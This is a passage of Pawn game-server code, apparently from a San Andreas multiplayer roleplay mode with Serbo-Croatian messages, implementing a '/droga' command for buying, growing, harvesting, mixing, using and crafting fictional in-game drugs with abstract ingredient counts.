		    cena = kolicina*10;
		    if( PlayerInfo[ playerid ][ xNovac ] < cena) return SendErrorMessage( playerid, "Nemate dovoljno novca!Jedna semenka marihuane kosta 10$");
			Seeds[ playerid ] += kolicina;
	        DajIgracuNovac( playerid, -cena );
	        format( globalstring, sizeof( globalstring ), "Kupili ste %d semenki marihuane, za %d$.", kolicina, cena);
	        SCM( playerid, SVETLOPLAVA, globalstring);
			return 1;
		}
		else if(strcmp(opcija,"kokain",true) == 0) {
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_KOKAIN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( !IsPlayerInRangeOfPoint( playerid, 6.0, 870.3927, -24.9189, 63.9863 ) ) return SendErrorMessage( playerid, "Nisi na mestu uzimanja semena." );
		    new cena;
		    if(kolicina < 1 || kolicina > 1000) return SendErrorMessage( playerid, "Ne mozete uzeti vise od 1000 semenki odjednom!");
		    cena = kolicina*15;
		    if( PlayerInfo[ playerid ][ xNovac ] < cena) return SendErrorMessage( playerid, "Nemate dovoljno novca!Jedna semenka kokaina kosta 15$");
			SeedsK[ playerid ] += kolicina;
	        DajIgracuNovac( playerid, -cena );
	        format( globalstring, sizeof( globalstring ), "Kupili ste %d semenki kokaina, za %d$.", kolicina, cena);
	        SCM( playerid, SVETLOPLAVA, globalstring);
			return 1;
		}
		return 1;
	}
	else if( strcmp( item, "osusi",true) == 0) {
	    if( sscanf( params, "s[32]s[20]", item, opcija ) ) {
	        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/droga osusi [droga]");
			SCM( playerid, BELA, "Droge: Marihuana, Kokain");
			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			return 1;
		}
		if(strcmp(opcija,"marihuana",true) == 0) {
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_MARIHUANA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
			if( PlayerInfo[ playerid ][ xMarihuana ] == 0 ) return SendErrorMessage( playerid, "Nemate marihuanu za osusiti." );
			if( PlayerInfo[ playerid ][ xDrugCode ][ 0] != 0 && PlayerInfo[ playerid ][ xDrugCode ][ 1 ] != 0 && PlayerInfo[ playerid ][ xDrugCode ][ 2 ] != 0 && PlayerInfo[ playerid ][ xDrugCode ][ 3 ] != 0 && PlayerInfo[ playerid ][ xDrugCode ][ 4 ] != 0 ) return SendErrorMessage( playerid, "Svih vasih 5 slotova za droge su puni!");
			if( inProperty[ playerid ] == -1 && inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u vasoj kuci/stanu/vikendici ili intu orge." );
			if( PlayerInfo[ playerid ][ xDrugCode ][ 0 ] == 0)
			{
				PlayerInfo[ playerid ][ xDrugCode ][ 0 ] = 1999;
                PlayerInfo[ playerid ][ xDrug ][ 0 ] = PlayerInfo[ playerid ][ xMarihuana ];
			}
     		else if( PlayerInfo[ playerid ][ xDrugCode ][ 1 ] == 0)
			{
				PlayerInfo[ playerid ][ xDrugCode ][ 1 ] = 1999;
                PlayerInfo[ playerid ][ xDrug ][ 1 ] = PlayerInfo[ playerid ][ xMarihuana ];
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 2 ] == 0)
	        {
				PlayerInfo[ playerid ][ xDrugCode ][ 2 ] = 1999;
                PlayerInfo[ playerid ][ xDrug ][ 2 ] = PlayerInfo[ playerid ][ xMarihuana ];
			}
		    else if( PlayerInfo[ playerid ][ xDrugCode ][ 3 ] == 0)
			{
            	PlayerInfo[ playerid ][ xDrugCode ][ 3 ] = 1999;
                PlayerInfo[ playerid ][ xDrug ][ 3 ] = PlayerInfo[ playerid ][ xMarihuana ];
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 4 ] == 0)
		    {
           	  	PlayerInfo[ playerid ][ xDrugCode ][ 4 ] = 1999;
                PlayerInfo[ playerid ][ xDrug ][ 4 ] = PlayerInfo[ playerid ][ xMarihuana ];
			}
			SendClientMessageEx( playerid, SRVBOJA1, "Osusio si %d grama marihuane.", PlayerInfo[ playerid ][ xMarihuana ] );
			PlayerInfo[ playerid ][ xMarihuana ] = 0;
			return 1;
		}
		else if(strcmp(opcija,"kokain",true) == 0) {
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_KOKAIN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
            if( PlayerInfo[ playerid ][ xKokain2 ] == 0 ) return SendErrorMessage( playerid, "Nemate kokain za osusiti." );
			if( inProperty[ playerid ] == -1 && inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u vasoj kuci/stanu/vikendici ili intu orge." );
            PlayerInfo[ playerid ][ xKokain ] += PlayerInfo[ playerid ][ xKokain2 ];
			SendClientMessageEx( playerid, SRVBOJA1, "Osusio si %d grama kokaina.", PlayerInfo[ playerid ][ xKokain2 ] );
			PlayerInfo[ playerid ][ xKokain2 ] = 0;
			return 1;
		}
		return 1;
	}
	else if( strcmp( item, "vremedobranja",true) == 0) {
	    new found, plantid;
	    for( new i = 1; i < MAX_PLANTS; i++) {
	        if( IsPlayerInRangeOfPoint( playerid, 2.0, DrogaStab[ i ][Plantx], DrogaStab[ i ][Planty], DrogaStab[ i ][Plantz] ) ) {
	            plantid = i;
	            found = 1;
	            break;
	        }
	        else
	            continue;
	    }
	    if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu posadjene stabiljke.");
	    if( strcmp( ImeIgraca( playerid ), DrogaStab[ plantid ][ wOwner ], true) == 0 ) {
		    if( DrogaStab[ plantid ][ wType ] == 1 ) {
				if( DrogaStab[ plantid ][ wHoursPassed ] >= 0 && DrogaStab[ plantid ][ wHoursPassed ] < 2 ) {
				    SCM( playerid, SRVBOJA1, "* Prerano je jos za branje marihuane. " );
				}
				if( DrogaStab[ plantid ][ wHoursPassed ] >= 2 && DrogaStab[ plantid ][ wHoursPassed ] < 4 ) {
				    SCM( playerid, SRVBOJA1, "* Ako uberes marihuanu sad dobijas 2 grama. " );
				}
				if( DrogaStab[ plantid ][ wHoursPassed ] >= 4 && DrogaStab[ plantid ][ wHoursPassed ] < 6 ) {
			        SCM( playerid, SRVBOJA1, "* Ako uberes marihuanu sad dobijas 3 grama. " );
			    }
			    if( DrogaStab[ plantid ][ wHoursPassed ] >= 6 && DrogaStab[ plantid ][ wHoursPassed ] <= 8 ) {
			        SCM( playerid, SRVBOJA1, "* Ako uberes marihuanu sad dobijas 4 grama. " );
			    }
			    if( DrogaStab[ plantid ][ wHoursPassed ] > 8 && DrogaStab[ plantid ][ wHoursPassed ] <= 9 ) {
			        SCM( playerid, SRVBOJA1, "* Ako uberes marihuanu sad dobijas 1 gram. " );
			    }
			    if( DrogaStab[ plantid ][ wHoursPassed ] > 9 ) {
			        SCM( playerid, SRVBOJA1, "* Prekasno je jos za branje marihuane. " );
			    }
			}
			else if( DrogaStab[ plantid ][ wType ] == 2 ) {

			    if( DrogaStab[ plantid ][ wHoursPassed ] <= 2 ) {
				    SCM( playerid, SRVBOJA1, "* Prerano je jos za branje kokaina. " );
				}
				else if( DrogaStab[ plantid ][ wHoursPassed ] > 11 ) {
			        SCM( playerid, SRVBOJA1, "* Prekasno je jos za branje kokaina. " );
			    }
			    else if( DrogaStab[ plantid ][ wHoursPassed ] >= 3 && DrogaStab[ plantid ][ wHoursPassed ] <= 10 ) {
			        new jebomajku = DrogaStab[ plantid ][ wHoursPassed ]*5;
			        SendClientMessageEx( playerid, SRVBOJA1, "* Ako uberes kokain sad dobijas %d grama.", jebomajku );
			    }
			}
		} else SendErrorMessage( playerid, "Ovo nije tvoja stabiljka droge. " );
		return 1;
	}
	else if( strcmp( item, "oberi",true) == 0) {
	    new found, plantid;
	    for( new i = 1; i < MAX_PLANTS; i++) {
	        if( IsPlayerInRangeOfPoint( playerid, 2.0, DrogaStab[ i ][Plantx], DrogaStab[ i ][Planty], DrogaStab[ i ][Plantz] ) ) {
	            plantid = i;
	            found = 1;
	            break;
	        }
	        else
	            continue;
	    }
	    if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu posadjene stabiljke.");
	    if( strcmp( ImeIgraca( playerid ), DrogaStab[ plantid ][ wOwner ], true) == 0 )
		{
		    if( DrogaStab[ plantid ][ wType ] == 1 ) {
				if( DrogaStab[ plantid ][ wHoursPassed ] >= 0 && DrogaStab[ plantid ][ wHoursPassed ] < 2 )
				{
				    SCM( playerid, SRVBOJA1, "* Prerano si ubrao marihuanu i nisi dobio ni jedan gram. " );
				}
				if( DrogaStab[ plantid ][ wHoursPassed ] >= 2 && DrogaStab[ plantid ][ wHoursPassed ] < 4 )
				{
				    SCM( playerid, SRVBOJA1, "* Ubrao si marihuanu i uzeo 2 grama. " );
				    PlayerInfo[ playerid ][ xMarihuana ] += 2;
				}
				if( DrogaStab[ plantid ][ wHoursPassed ] >= 4 && DrogaStab[ plantid ][ wHoursPassed ] < 6 )
				{
			        SCM( playerid, SRVBOJA1, "* Ubrao si marihuanu i uzeo 3 grama. " );
			        PlayerInfo[ playerid ][ xMarihuana ] += 3;
			    }
			    if( DrogaStab[ plantid ][ wHoursPassed ] >= 6 && DrogaStab[ plantid ][ wHoursPassed ] <= 8 )
			    {
			        SCM( playerid, SRVBOJA1, "* Ubrao si marihuanu i uzeo 4 grama. " );
			        PlayerInfo[ playerid ][ xMarihuana ] += 4;
			    }
			    if( DrogaStab[ plantid ][ wHoursPassed ] > 8 && DrogaStab[ plantid ][ wHoursPassed ] <= 9 )
			    {
			        SCM( playerid, SRVBOJA1, "* Ubrao si marihuanu i uzeo 1 gram. " );
			        PlayerInfo[ playerid ][ xMarihuana ] += 1;
			    }
			    if( DrogaStab[ plantid ][ wHoursPassed ] > 9 )
			    {
			        SCM( playerid, SRVBOJA1, "* Kasno si ubrao marihuanu, te nisi dobio ni jedan gram. " );
			    }

			    DrogaStab[ plantid ][Plantx] = 0;
			   	DrogaStab[ plantid ][Planty] = 0;
			   	DrogaStab[ plantid ][Plantz] = 0;
			   	DrogaStab[ plantid ][wType] = 0;
				DrogaStab[ plantid ][wPlanted] = 0;
				DrogaStab[ plantid ][wHoursPassed] = 0;
				strmid( DrogaStab[ plantid ][ wOwner ], "Niko", 0, strlen( "Niko" ), 255);
				DrogaStab[ plantid ][wViwo] = GetPlayerVirtualWorld( playerid );
			    DestroyDynamicObject( DrogaStab[ plantid ][ wObjectID ] );
	            ApplyAnimation( playerid, "BOMBER","BOM_Plant_Loop",4.0,0,0,0,0,0,1);
	     		format( globalstring, sizeof( globalstring ), "%s ubire marihuanu.", ImeIgraca( playerid ) );
				PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
				IgracPosadio[ playerid ]--;
			}
			else if( DrogaStab[ plantid ][ wType ] == 2 ) {

			    if( DrogaStab[ plantid ][ wHoursPassed ] <= 2 )
				{
				    SCM( playerid, SRVBOJA1, "* Prerano si ubrao kokain i nisi dobio ni jedan gram. " );
				}
				if( DrogaStab[ plantid ][ wHoursPassed ] > 11 )
			    {
			        SCM( playerid, SRVBOJA1, "* Kasno si ubrao kokain, te nisi dobio ni jedan gram. " );
			    }
			    if( DrogaStab[ plantid ][ wHoursPassed ] >= 3 && DrogaStab[ plantid ][ wHoursPassed ] <= 10 )
			    {
			        kolicina = DrogaStab[ plantid ][ wHoursPassed ]*5;
			        SendClientMessageEx( playerid, SRVBOJA1, "* Ubrao si neosuseni kokain i uzeo %d grama. ", kolicina );
			        PlayerInfo[ playerid ][ xKokain2 ] += kolicina;
			    }

			    DrogaStab[ plantid ][Plantx] = 0;
			   	DrogaStab[ plantid ][Planty] = 0;
			   	DrogaStab[ plantid ][Plantz] = 0;
			   	DrogaStab[ plantid ][wType] = 0;
				DrogaStab[ plantid ][wPlanted] = 0;
				DrogaStab[ plantid ][wHoursPassed] = 0;
				strmid( DrogaStab[ plantid ][ wOwner ], "Niko", 0, strlen( "Niko" ), 255);
				DrogaStab[ plantid ][wViwo] = GetPlayerVirtualWorld( playerid );
			    DestroyDynamicObject( DrogaStab[ plantid ][ wObjectID ] );
	            ApplyAnimation( playerid, "BOMBER","BOM_Plant_Loop",4.0,0,0,0,0,0,1);
	     		format( globalstring, sizeof( globalstring ), "%s ubire stabiljku kokaina.", ImeIgraca( playerid ) );
				PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
				IgracPosadio[ playerid ]--;
			}
		}
		else SendErrorMessage( playerid, "Ovo nije tvoja stabiljka droge. " );
	    return 1;
	}
	else if( strcmp( item, "mix", true ) == 0 ) {
	    if( sscanf( params, "s[32]ii", item, slot, slot2 ) ) {
			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/droga mix [slot1] [slot2]");
	     	SCM( playerid, BELA, "[Pomoc] Slot znaci broj vaseg mjesta droge, moze biti od 1 do 5.");
	     	SCM( playerid, BELA, "[Pomoc] Ukucajte /droga view ako zelite vidjeti slot vase droge!");
	     	SCM( playerid, BELA, "[Pomoc] Ovom komandom cete spojiti dva paketica droge u jedan!");
	        SCM( playerid, BELA, "___________________________________________________________________");
			return 1;
		}
		if( slot == slot2 ) return SendErrorMessage( playerid, "Ne mozete uneti 2 puta isti slot." );
		
        if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota 1!");
        if( slot2 < 1 || slot2 > 5 ) return SendErrorMessage( playerid, "Krivi broj slota 2!");
        
		new slotnovi = slot-1;
		new slot2novi = slot2-1;
		
		if( PlayerInfo[ playerid ][ xDrug ][ slot2novi ] == 0 ) return SendErrorMessage( playerid, "Slot 2 je prazan." );
		if( PlayerInfo[ playerid ][ xDrug ][ slotnovi ] == 0 ) return SendErrorMessage( playerid, "Slot 1 je prazan." );
		
		new code1 = PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ];
		new code2 = PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ];
		
		if( IsAMarijuana( PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] ) && !IsAMarijuana( PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ] ) ) {
      		SendErrorMessage( playerid, "Ne smiksati droge razlicite vrste." );
			return 1;
		}
        if( IsALSD( PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] ) && !IsALSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ] )  ) {
      		SendErrorMessage( playerid, "Ne smiksati droge razlicite vrste." );
			return 1;
		}
		if( IsACocaine( PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] ) && !IsACocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ] )  ) {
      		SendErrorMessage( playerid, "Ne smiksati droge razlicite vrste." );
			return 1;
		}
		if( IsABlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] ) && !IsABlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ] )  ) {
      		SendErrorMessage( playerid, "Ne smiksati droge razlicite vrste." );
			return 1;
		}
		if( IsACrack( PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] ) && !IsACrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ] )  ) {
      		SendErrorMessage( playerid, "Ne smiksati droge razlicite vrste." );
			return 1;
		}
		if( IsAMethamphetamine( PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] ) && !IsAMethamphetamine( PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ] )  ) {
      		SendErrorMessage( playerid, "Ne smiksati droge razlicite vrste." );
			return 1;
		}
		if( IsAHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] ) && !IsAHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ] )  ) {
      		SendErrorMessage( playerid, "Ne smiksati droge razlicite vrste." );
			return 1;
		}
	        
		PlayerInfo[ playerid ][ xDrug ][ slotnovi ] = ( PlayerInfo[ playerid ][ xDrug ][ slotnovi ] + PlayerInfo[ playerid ][ xDrug ][ slot2novi ] );
		PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] = ( ( code1 + code2 )/2 );

		PlayerInfo[ playerid ][ xDrug ][ slot2novi ] = 0;
		PlayerInfo[ playerid ][ xDrugCode ][ slot2novi ] = 0;
		
		SavePlayer( playerid );
		SendInfoMessage( playerid, "Pomesali ste 2 slota sa droge i dobili %s.", GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ slotnovi ] ) );
		return 1;
	}
	else if( strcmp( item, "use",true) == 0 ) {
	
        if( sscanf( params, "s[32]i", item, slot ) ) {
			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/droga use [slot]");
	     	SCM( playerid, BELA, "[Pomoc] Slot znaci broj vaseg mjesta droge, moze biti od 1 do 5.");
	     	SCM( playerid, BELA, "[Pomoc] Ukucajte /droga view ako zelite vidjeti slot vase droge!");
	        SCM( playerid, BELA, "___________________________________________________________________");
			return 1;
		}
		slot2 = slot-1;
		if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Broj slota ne moze biti manji od 1 i veci od 5!");
		if( PlayerDrugged[ playerid ] == true ) return SendErrorMessage( playerid, "Vec si nadrogiran.Ne mozes koristiti drogu dok si nadrogiran!");
        if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes da se drogiras dok si u kolima." );
		if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] == 0) return SendErrorMessage( playerid, "Nemate droge pod tim slotom!");
		if( IsAMarijuana( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( PlayerInfo[ playerid ][ xUpaljac ] == 0) return SendErrorMessage( playerid, "Nemas upaljac!");
		    PlayerInfo[ playerid ][ xDrug ][ slot2 ] --;
		    ApplyAnimation( playerid,"SMOKING","M_smk_in",3.0,0,0,0,0,0, 1);
 			SetPlayerSpecialAction( playerid,21);
 			PlayerStoned[ playerid ] = true;
			PlayerDrugged[ playerid ] = true;
			SetPlayerTime( playerid, 12, 0);
			SetPlayerDrunkLevel( playerid, 10000);
			SetPVarInt( playerid, "PlayerDruggedSeconds", 5 );
			SetPlayerWeather( playerid, -66 );
			DodajIgracuHP( playerid, 20 );
			DodajIgracuArmour( playerid, 10 );
			
			if( Maskuse[ playerid ] == true )
				format( globalstring, sizeof( globalstring ), "Maska_%d pocinje pusit marihuanu", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "%s pocinje pusit marihuanu.", ImeIgraca( playerid ) );

			PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
		}
		else if( IsALSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
			SetPlayerDrunkLevel( playerid, 18000);
			PlayerInfo[ playerid ][ xDrug ][ slot2 ] --;
			PlayerStoned[ playerid ] = true;
			PlayerDrugged[ playerid ] = true;
			SetPlayerTime( playerid, 12, 0);
			SetPVarInt( playerid, "PlayerDruggedSeconds", 5 );
			SetPlayerWeather( playerid, 2009 );
			DodajIgracuHP( playerid, 30 );
			DodajIgracuArmour( playerid, 10 );

			if( Maskuse[ playerid ] == true )
				format( globalstring, sizeof( globalstring ), "Maska_%d stavlja tabletu LSD-a na jezik", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "%s stavlja tabletu LSD-a na jezik.", ImeIgraca( playerid ) );

			PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
		}
		else if( IsAMethamphetamine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( PlayerInfo[ playerid ][ xUpaljac ] == 0) return SendErrorMessage( playerid, "Nemas upaljac!");
			UsingMeth( playerid, PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] );
			SetPlayerDrunkLevel( playerid, 28000);
			PlayerInfo[ playerid ][ xDrug ][ slot2 ] --;
			PlayerStoned[ playerid ] = true;
			PlayerDrugged[ playerid ] = true;
			SetPlayerTime( playerid, 12, 0);
			SetPVarInt( playerid, "PlayerDruggedSeconds", 10 );
			ApplyAnimation( playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 0, 0, 1);
			SetPlayerWeather( playerid, 1880 );

			if( Maskuse[ playerid ] == true )
				format( globalstring, sizeof( globalstring ), "Maska_%d pocinje pusit metamfetamin", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "%s pocinje pusit metamfetamin.", ImeIgraca( playerid ) );
			PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
		}
		else if( IsACrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
			if( PlayerInfo[ playerid ][ xUpaljac ] == 0) return SendErrorMessage( playerid, "Nemas upaljac!");
		    UsingCrack( playerid, PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] );
		    PlayerInfo[ playerid ][ xDrug ][ slot2 ] --;
		    PlayerStoned[ playerid ] = true;
			PlayerDrugged[ playerid ] = true;
			SetPlayerTime( playerid, 12, 0);
		    SetPlayerDrunkLevel( playerid, 35000);
			SetPVarInt( playerid, "PlayerDruggedSeconds", 5 );
			SetPlayerWeather( playerid, 1782);

			if( Maskuse[ playerid ] == true )
				format( globalstring, sizeof( globalstring ), "Maska_%d pocinje pusit crack", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "%s pocinje pusit crack.", ImeIgraca( playerid ) );
		    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
		}
		else if( IsABlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( PlayerInfo[ playerid ][ xUpaljac ] == 0 ) return SendErrorMessage( playerid, "Nemas upaljac!");
			UsingBMeth( playerid, PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] );
			SetPlayerDrunkLevel( playerid, 40000);
			PlayerInfo[ playerid ][ xDrug ][ slot2 ] --;
			PlayerStoned[ playerid ] = true;
			PlayerDrugged[ playerid ] = true;
			SetPlayerTime( playerid, 12, 0);
			SetPVarInt( playerid, "PlayerDruggedSeconds", 10 );
			ApplyAnimation( playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 0, 0, 1);
			SetPlayerWeather( playerid, 1880);

			if( Maskuse[ playerid ] == true )
				format( globalstring, sizeof( globalstring ), "Maska_%d pocinje pusit blue metamfetamin", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "%s pocinje pusit blue metamfetamin.", ImeIgraca( playerid ) );
			PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
		}
		else if( IsACocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    UsingCocaine( playerid, PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] );
			SetPlayerDrunkLevel( playerid, 45000);
			PlayerStoned[ playerid ] = true;
			PlayerDrugged[ playerid ] = true;
			SetPlayerTime( playerid, 12, 0);
			SetPVarInt( playerid, "PlayerDruggedSeconds", 5 );
			PlayerInfo[ playerid ][ xDrug ][ slot2 ] --;
			SetPlayerWeather( playerid, 1998);

			if( Maskuse[ playerid ] == true )
				format( globalstring, sizeof( globalstring ), "Maska_%d smrce kokain", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "%s smrce kokain.", ImeIgraca( playerid ) );
			PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
		}
		else if( IsAHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( PlayerInfo[ playerid ][ xInekcija ] == false) return SendErrorMessage( playerid, "Nemas injekciju za heroin!");
		    UsingHeroin( playerid, PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] );
		    PlayerInfo[ playerid ][ xDrug ][ slot2 ] --;
			SetPlayerWeather( playerid, 1765);
			SetPlayerDrunkLevel( playerid, 50000);
			PlayerStoned[ playerid ] = true;
			PlayerDrugged[ playerid ] = true;
			SetPlayerTime( playerid, 12, 0);
			PlayerInfo[ playerid ][ xInekcija ] = false;
			SetPVarInt( playerid, "PlayerDruggedSeconds", 10 );
			ApplyAnimation( playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 0, 0, 1);

			if( Maskuse[ playerid ] == true )
				format( globalstring, sizeof( globalstring ), "Maska_%d ubrizgava heroin u venu", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "%s ubrizgava heroin u venu.", ImeIgraca( playerid ) );
			PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
		}
		if( PlayerInfo[ playerid ][ xDrug ][ slot2 ] == 0)
			PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 0;

		return 1;
	}
	else if( strcmp( item, "napravi",true) == 0) {
	    if( sscanf( params, "s[32]s[20] ", item, opcija)) {
	        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/droga napravi [droga]");
			SCM( playerid, BELA, "Droge: Meth, LSD, Heroin, Kokain, BlueMeth");
			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			return 1;
		}
		if(strcmp(opcija,"meth",true) == 0) {
		    if( inProperty[ playerid ] == -1 && inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u vasoj kuci/stanu/vikendici ili intu orge." );
            if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_METH ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
			new pseudo, solna, sodab, crvenif, razlika = 0;
		    if( sscanf(params, "s[32]s[20]iiiii", item, opcija, slot, pseudo, solna, sodab, crvenif ) ) return SendUsageMessage( playerid, "/droga napravi meth [slot] [pseudo] [solna kis.] [soda b.] [crveni f.]");
            if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] != 0) return SendErrorMessage( playerid, "Taj slot je pun!");
			if( solna < 1 || solna > PlayerInfo[ playerid ][ xSolna ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu solne kiseline kod sebe!");
			if( pseudo < 1 || pseudo > PlayerInfo[ playerid ][ xPseudo ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu pseudo tabletica kod sebe!");
			if( sodab < 1 || sodab > PlayerInfo[ playerid ][ xSodaB ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu sode bikarbone kod sebe!");
			if( crvenif < 1 || crvenif > PlayerInfo[ playerid ][ xCrveniF ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu crvenog fosfora kod sebe!");
	        if( solna != 8 ) razlika += (random(20-10)+solna);
			if( sodab != 2 ) razlika += (random(20-10)+sodab);
			if( crvenif != 10 ) razlika += (random(20-10)+crvenif);
			if( pseudo != 7 ) razlika += (random(20-10)+pseudo);
			PlayerInfo[ playerid ][ xSolna ] -= solna;
			PlayerInfo[ playerid ][ xPseudo ] -= pseudo;
			PlayerInfo[ playerid ][ xSodaB ] -= sodab;
			PlayerInfo[ playerid ][ xCrveniF ] -= crvenif;
			if( IsAMethamphetamine( 3999-razlika ) ) {
	        	PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 3999-razlika;
	            PlayerInfo[ playerid ][ xDrug ][ slot2 ] = (random(10-5)+5);

				SendInfoMessage( playerid, "Napravili ste %d grama metamfetamina.", PlayerInfo[ playerid ][ xDrug ][ slot2 ] );

			} else {
				SCM( playerid, ZUTA, "Smesa vam nije uspjela!");
			}
			return 1;
		}
		else if(strcmp(opcija,"bluemeth",true) == 0) {
		    if( inProperty[ playerid ] == -1 && inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u vasoj kuci/stanu/vikendici ili intu orge." );
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_BMETH ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    new metila, solna, sodab, crvenif, razlika = 0;
		    if( sscanf(params, "s[32]s[20]iiiii", item, opcija, slot, metila, solna, sodab, crvenif ) ) return SendUsageMessage( playerid, "/droga napravi bluemeth [slot] [methylamin] [solna kis.] [soda b.] [crveni f.]");
            if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] != 0) return SendErrorMessage( playerid, "Taj slot je pun!");
			if( solna < 1 || solna > PlayerInfo[ playerid ][ xSolna ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu solne kiseline kod sebe!");
			if( metila < 1 || metila > PlayerInfo[ playerid ][ xMetilAmin ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu methylamina kod sebe!");
			if( sodab < 1 || sodab > PlayerInfo[ playerid ][ xSodaB ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu sode bikarbone kod sebe!");
